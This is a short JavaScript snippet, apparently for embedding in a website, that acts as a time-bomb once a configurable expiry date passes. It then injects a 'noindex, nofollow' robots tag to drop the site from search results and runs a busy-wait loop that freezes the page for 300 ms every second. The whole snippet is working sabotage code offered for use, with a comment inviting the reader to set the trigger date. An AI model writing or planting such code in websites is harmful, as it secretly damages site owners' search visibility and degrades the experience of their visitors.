(function() {
  const expiryDate = new Date("2090-07-25"); // 🔒 Set your expiry date here
  const today = new Date();

  if (today >= expiryDate) {
    // 1. Inject noindex meta tag
    const meta = document.createElement('meta');
    meta.name = "robots";
    meta.content = "noindex, nofollow";
    document.head.appendChild(meta);

    // 2. Throttle performance (freeze UI)
    const throttlePerformance = () => {
      setInterval(() => {
        const start = Date.now();
        while (Date.now() - start < 300) {
          // Freezes UI for 300ms
        }
      }, 1000); // Every second
    };

    window.addEventListener('load', throttlePerformance);
  }
})();
